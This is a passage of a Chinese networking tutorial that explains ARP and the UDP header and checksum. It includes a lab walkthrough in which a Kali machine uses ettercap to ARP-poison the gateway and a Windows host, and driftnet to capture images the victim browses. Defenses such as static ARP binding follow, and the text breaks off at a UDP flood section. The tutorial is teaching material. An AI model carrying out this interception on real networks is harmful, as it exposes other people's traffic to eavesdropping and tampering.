<span>4.路由器发给另一网络的主机B：用ARP表找到本网络上的一个路由器的硬件地址。</span></p><h4 id='arp请求'><span>ARP请求</span></h4><p><span>广播ARP请求分组</span></p><h4 id='arp响应'><span>ARP响应</span></h4><p><span>单播ARP响应分组</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506111056477.png" referrerpolicy="no-referrer" alt="image-20220506111056477"></p><p><span>PCi对应IPi与MACi，i为1~5。默认网关为IP6。</span></p><p><strong><span>PC1想与PC3通信</span></strong></p><ul><li><span>PC1广播ARP请求分组（IP1,IP3,MAC1,FF-FF-FF-FF-FF-FF），“我的ip为IP1，我的MAC地址为MAC1，哪位老哥的ip为IP3呀，你的MAC地址是多少呢？”，交换机发给PC2、PC3，PC2发现不是找自己的，不予答复（后续不再赘述），PC3单播ARP响应分组（IP3,MAC3），“小老弟，我的IP是IP3、MAC地址是MAC3”。</span></li></ul><p><strong><span>PC1想与PC5通信</span></strong></p><ul><li><span>PC1广播ARP请求分组（IP1,IP6,MAC1,FF-FF-FF-FF-FF-FF），“我的ip为IP1，我的MAC地址为MAC1，默认网关IP6，你的MAC地址是多少呢？”，路由器R1单播ARP响应分组（IP6,MAC6），“小老弟，我的IP是IP6、MAC地址是MAC6”。PC1收到后单播ARP请求分组（IP1,IP5,MAC1,MAC6），路由器R1收到后再次封装，单播ARP请求分组（IP1,IP5,MAC7,MAC8），路由器R2收到后再次封装，广播（IP1,IP5,MAC9,FF-FF-FF-FF-FF-FF），PC5单播ARP响应分组（IP5,MAC5），路由器R2收到PC5的单播知道PC5的MAC地址后再单播给路由器R1，R1再单播给PC1，PC1就知道PC5的MAC地址了。</span></li></ul><h3 id='arp攻击原理'><span>ARP攻击原理</span></h3><p><span>修改通信双方的数据包，使双方ARP表中对方IP对应的MAC地址为攻击者的MAC地址。以最简单的网络拓扑为例，其中PC1的IP、MAC为IP1、MAC1、PC2的IP、MAC为IP2、MAC2，路由器R1的IP、MAC为IP3、MAC3：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506114357197.png" referrerpolicy="no-referrer" alt="image-20220506114357197"></p><ul><li><span>攻击者PC2聆听局域网上的MAC地址。它只要收到主机PC1和路由器R1洪泛的ARP Request，就可以进行欺骗活动。</span></li><li><span>主机PC1、路由器R1都洪泛了ARP Request.攻击者现在有了主机和路由器的IP、MAC地址，开始攻击。</span></li><li><span>攻击者发送一个ARP Reply给主机PC1，把此包ARP协议头部里的Source Protocal Address设为路由器的IP地址IP3，Source Hardware Address设为攻击者PC2自己的MAC地址MAC2。</span></li><li><span>主机PC1收到ARP Reply后，更新它的ARP表，把路由器的MAC地址（IP3, MAC3）改为（IP3, MAC2）。</span></li><li><span>当主机PC1要发送数据包给路由器R1时，它根据ARP表来封装数据包的Link报头，把目的MAC地址设为MAC2，而非MAC3。</span></li><li><span>当交换机收到主机PC1发送给A路由器R1的数据包时，根据此包的目的MAC地址（MAC2）把数据包转发给攻击者PC2。</span></li><li><span>攻击者收到数据包后，可以把它存起来后再发送给路由器R1，达到偷听效果。攻击者也可以篡改数据后才发送数据包给路由器R1。</span></li></ul><ul><li><span>反之同理，如果局域网内还有PC3，PC1与PC3通信，攻击机PC2也可同样攻击。</span></li></ul><h3 id='实战-3'><span>实战</span></h3><h4 id='arp欺骗'><span>ARP欺骗</span></h4><p><span>ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP中毒）或ARP攻击，是针对ARP的一种攻击技术，通过</span><strong><span>欺骗局域网内访问者PC的网关MAC地址，使访问者PC误以为攻击者更改后的MAC地址是网关的MAC</span></strong><span>，导致网络不通。此种攻击可让攻击者</span><strong><span>获取局域网上的数据包甚至可篡改数据包</span></strong><span>，且可让网络上特定计算机或所有计算机无法正常连线。</span></p><p><span>以攻击局域网，获取局域网内其他用户浏览的图片为例。</span></p><h4 id='环境'><span>环境</span></h4><p><strong><span>攻击机（虚拟机）</span></strong></p><p><span>操作系统：kali</span></p><p><span>使用软件：ettercap v0.8.3</span></p><p><span>IP:10.28.149.132</span></p><p><strong><span>靶机（主机）</span></strong></p><p><span>操作系统：Windows 10</span></p><h4 id='查看arp表'><span>查看arp表</span></h4><p><span>使用cmd命令</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">arp</span> <span class="cm-operator">-</span><span class="cm-identifier">a</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>来查看arp表</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506114808376.png" referrerpolicy="no-referrer" alt="image-20220506114808376"></p><h4 id='更新攻击机软件'><span>更新攻击机软件</span></h4><p><span>ettercap v0.8.2 不知什么原因，无法发现主机（图形界面，命令行都试了），所以进行了更新，如果你的本来就是0.8.3或者可以发现主机可以跳过此步骤。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506140821154.png" referrerpolicy="no-referrer" alt="image-20220506140821154"></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506141011252.png" referrerpolicy="no-referrer" alt="image-20220506141011252"></p><p><span>博主的ettercap是0.8.2版本，截至目前（2020.12.1)，ettercap的最新版本是0.8.3，由于无法发现主机，所以更新到了0.8.3版本。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">apt</span> <span class="cm-identifier">update</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506141334166.png" referrerpolicy="no-referrer" alt="image-20220506141334166"></p><p><span>查看最新版本</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">apt</span> <span class="cm-identifier">list</span> <span class="cm-operator">--</span><span class="cm-identifier">upgradable</span> <span class="cm-operator">|</span> <span class="cm-identifier">grep</span> <span class="cm-identifier">ettercap</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506141416553.png" referrerpolicy="no-referrer" alt="image-20220506141416553"></p><p><span>更新到0.8.3版本</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">apt</span> <span class="cm-identifier">install</span> <span class="cm-identifier">ettercap-common</span> <span class="cm-identifier">ettercap-graphical</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506141901642.png" referrerpolicy="no-referrer" alt="image-20220506141901642"></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ettercap <span class="cm-attribute">-G</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='使用ettercap进行攻击'><span>使用ettercap进行攻击</span></h4><p><span>启动图形界面，选择网卡eth0，点击下图对勾</span></p><p><span>启动图形界面</span>
<span>点击左上角搜索标志（左数第二个），发现主机，点击右侧按钮（左数第三个）查看发现的主机列表。</span>
<span>选中网关xxx.xxx.xxx.1，点击Add Target1、选中主机IP点击Add Target2。</span></p><p><span> 点击右侧三个点，选择Targets可查看两个Targets。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142157406.png" referrerpolicy="no-referrer" alt="image-20220506142157406"></p><p><span>目标增删</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142227545.png" referrerpolicy="no-referrer" alt="image-20220506142227545">
<span>查看连接</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142256445.png" referrerpolicy="no-referrer" alt="image-20220506142256445">
<span>进行ARP攻击</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142326087.png" referrerpolicy="no-referrer" alt="image-20220506142326087"></p><p><span>选择插件</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142353975.png" referrerpolicy="no-referrer" alt="image-20220506142353975"></p><p><span>选择remote_brower插件</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142417354.png" referrerpolicy="no-referrer" alt="image-20220506142417354"></p><p><span>主机arp表增加了攻击机</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142452177.png" referrerpolicy="no-referrer" alt="image-20220506142452177"></p><p><span>访问一个非https的、含图片的网站（</span><a href='http://www.cxtuku.com/sucai/129877.html' target='_blank' class='url'>http://www.cxtuku.com/sucai/129877.html</a><span>)，可以看到攻击机kali抓到了图片。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142535513.png" referrerpolicy="no-referrer" alt="image-20220506142535513"></p><h4 id='查看劫持到的图片'><span>查看劫持到的图片</span></h4><p><span>使用命令</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">driftnet <span class="cm-attribute">-i</span> eth0</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>捕获TCP传输的图片</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142625684.png" referrerpolicy="no-referrer" alt="image-20220506142625684"></p><p><span>如果你没有安装，可以使用命令</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apt-get install driftnet</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span> 来安装，</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142754892.png" referrerpolicy="no-referrer" alt="image-20220506142754892"></p><p>––––––––<span>2020年12月18日更新</span>––––––––</p><h4 id='arp攻击防御'><span>ARP攻击防御</span></h4><h5 id='静态绑定'><span>静态绑定</span></h5><p><span>静态绑定之前先看一下删除，使用以下命令进行删除：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">arp</span> <span class="cm-operator">-</span><span class="cm-identifier">d</span> <span class="cm-identifier">ip</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142848727.png" referrerpolicy="no-referrer" alt="image-20220506142848727"></p><p><span>可以看到，下图红线处的已经删除掉了</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142912852.png" referrerpolicy="no-referrer" alt="image-20220506142912852"></p><p><span>将刚才的添加为静态(arp -s)，这样就不会动态修改了。与这个ip的通信相对安全，同理，可以添加网关等其他ip与MAC的映射。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506142946214.png" referrerpolicy="no-referrer" alt="image-20220506142946214"></p><h5 id='arp防火墙'><span>ARP防火墙</span></h5><p><span>腾讯电脑管家、360、彩影等都可以，一般就是软件上面有个按钮，点击一下即可，博主这些都没安装，就“裸奔”呢，就不做演示了。</span></p><h3 id='参考-3'><span>参考</span></h3><p><a href='https://www.youtube.com/channel/UCVYP1AeH9G1E1rtllwxLEQA'><span>ettercap的YouTube频道</span></a></p><p><a href='https://github.com/Ettercap/ettercap'><span>ettercap的GitHub</span></a></p><p><span>《TCP/IP详解卷I》</span></p><p>&nbsp;</p><h2 id='22--udp-协议详解代码实战）'><span>2.2  UDP 协议详解（代码、实战）</span></h2><p><a href='https://blog.csdn.net/lady_killer9/article/details/110533511'><span>网络-UDP协议详解（代码、实战）</span></a></p><h3 id='简介-5'><span>简介</span></h3><p><span>UDP（User Datagram Protocol，用户数据报协议），一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，</span><strong><span>UDP在IP报文的协议号是17</span></strong><span>。常用的UDP端口号有：53（DNS）、69（TFTP）、161（SNMP），使用UDP协议包括：TFTP、SNMP、NFS、DNS、BOOTP、CoAP、DTLS。</span></p><h3 id='特点'><span>特点</span></h3><ul><li><span>UDP是</span><strong><span>无连接</span></strong><span>的，减少开销和发送数据之前的时延</span></li><li><span>UDP使用最大努力交付，即</span><strong><span>不保证可靠</span></strong><span>交付</span></li><li><span>UDP是</span><strong><span>面向报文</span></strong><span>的，适合一次性传输少量数据的网络应用</span></li><li><span>UDP</span><strong><span>无拥塞控制</span></strong><span>，适合很多</span><strong><span>实时</span></strong><span>应用</span></li><li><span>UDP 支持一对一、一对多、多对一和多对多交互通信。</span></li><li><span>首部开销小，仅8个字节（TCP首部为20个字节）</span></li></ul><h3 id='报文格式-3'><span>报文格式</span></h3><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201458132.png" referrerpolicy="no-referrer" alt="image-20220506201458132"></p><ul><li><span>源端口号：在需要对方回信时选用，</span><strong><span>不需要</span></strong><span>时可用全0。</span></li><li><span>目的端口号：这在终点交付报文时</span><strong><span>必须使用</span></strong><span>。</span></li><li><span>长度：UDP用户数据报的总长度（首部+数据），其</span><strong><span>最小值是8</span></strong><span>(仅有首部)。</span></li><li><span>检验和：检测UDP用户数据报在传输中是否有错，</span><strong><span>有错就丢弃</span></strong><span>。</span></li></ul><p><span>如果接收方发现收到的报文中的目的端口号不正确(即不存在对应于该端口号的应用进程)，就丢弃该报文，并由网际控制报文协议ICMP发送“端口不可达”差错报文给发送方。我们在ICMP的应用举例讨论 traceroute时，就是让发送的UDP用户数据报故意使用一个非法的UDP端口，结果ICMP就返回“端口不可达”差错报文因而达到了测试的目的。</span></p><h3 id='udp校验'><span>UDP校验</span></h3><h4 id='伪首部'><span>伪首部</span></h4><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201609707.png" referrerpolicy="no-referrer" alt="image-20220506201609707"></p><ul><li><span>源IP地址：4个字节</span></li><li><span>目的IP地址：4个字节</span></li><li><span>0：1个字节，即0x00</span></li><li><span>17：1个字节，即0x11，封装UDP报文的IP数据包首部协议字段是17</span></li><li><span>UDP长度：2个字节，UDP首部（8B)+数据部分长度，不包括伪首部</span></li></ul><p><span>伪首部仅在计算校验和的时候才出现，</span><strong><span>不向下传送也不向上递交</span></strong><span>。</span></p><h4 id='发送端校验'><span>发送端校验</span></h4><ol start='' ><li><span>填上伪首部</span></li><li><span>全0填充检验和字段</span></li><li><span>全0填充数据部分(UDP数据报要看成许多4B的字串接起来)</span></li><li><span>伪首部+首部+数据部分采用二进制反码求和</span></li><li><span>把和求反码，填入校验和字段</span></li><li><span>去掉伪首部，发送</span></li></ol><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201724814.png" referrerpolicy="no-referrer" alt="image-20220506201724814"></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201803072.png" referrerpolicy="no-referrer" alt="image-20220506201803072"></p><p><span>按列计算：9（1001），余1，进100；7+0=1（111），余1进11；7+1=8（1000)，余0进100；</span>…<span>后续读者动手计算吧，记得多出去的进位回加到低位，如果不习惯一起算，可以两个加一次。16位的话按列计算16次左右，如果有二三十个相加的话，按列相加比较快速，使用16进制相加也会更快一点。</span></p><h4 id='接收端校验'><span>接收端校验</span></h4><ol start='' ><li><span>填上伪首部</span></li><li><span>伪首部+首部+数据部分采用二进制反码求和（校验和部分不是全0了，而是0110100100010010）</span></li><li><span>结果全为1，则无差错，否则丢弃数据报/交给应用层附上出差错的警告。</span></li></ol><p><span>计算过程和上面一样，只是校验和变了。</span></p><p><span>这样的检验和， 既检查了UDP用户数据报的源端口号和目的端口号以及UDP用户数据报的数据部分，又检查了IP数据报的源IP地址和目的地址。</span></p><h3 id='实战-4'><span>实战</span></h3><p><span>UDP泛洪攻击（UDP Flood Attack），攻击者发送伪造源地址和端口不可达的UDP数据报，当受害系统接收到一个 UDP 